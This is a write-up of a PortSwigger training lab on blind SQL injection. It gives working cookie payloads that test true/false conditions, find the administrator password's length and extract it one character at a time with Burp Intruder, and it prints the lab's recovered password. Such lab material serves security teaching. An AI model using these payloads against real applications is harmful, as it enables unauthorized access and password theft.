**Lab: Blind SQL injection with conditional responses** - [**Link:**](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)


**Goal:**
Exploit a blind SQL injection vulnerability to extract the **administrator** password using conditional responses.
Login as **administrator** to solve the lab.


**Step-by-step:**

### 1. Confirm SQL Injection

Inject into the `TrackingId` cookie:

* `TrackingId=abc' AND 1=1--` → **Welcome back** (response present)
* `TrackingId=abc' AND 1=2--` → **No welcome back** (response different)

→ **Parameter is vulnerable to blind SQLi.**


### 2. Confirm target

Challenge says there is a table called `users` with columns `username` and `password`.
We want to extract the **administrator** password.


### 3. Find Password Length

Use payloads like:

```
TrackingId=abc' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > N) = 'administrator'--
```
(Here N = Natural Number)


Start increasing `N` manually or use Burp Intruder:

* **Intruder Position:** `TrackingId=abc' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > §1§) = 'administrator'--`
* **Payload type:** Numbers from 1 to 30

→ Observe when the "Welcome back" disappears.
→ My Result: Response changes after 20 → password is likely **20 characters** long.


### 4. Extract the Password (Brute-force)

#### Check 1 character at a time using `SUBSTRING()`:

```
TrackingId=abc' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 'a'-- 
```

Use **Burp Intruder** to automate:

* **Attack type:** Cluster bomb
* **Position:**

  ```
  TrackingId=abc' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator') = '§2§'-- 
  ```
* **Payload 1:** Numbers from 1 to 20
* **Payload 2:** Brute Forcer (lowercase + digits)

→ When the **response length** changes, record that character.
→ Repeat for all 20 positions.


### 5. Final Result

After completing the attack, retrieved password:

```
Password: 5o5xy0pbiosl2grktqd8
```

Login with:

* **Username:** administrator
* **Password:** 5o5xy0pbiosl2grktqd8


✅ **Lab Solved**
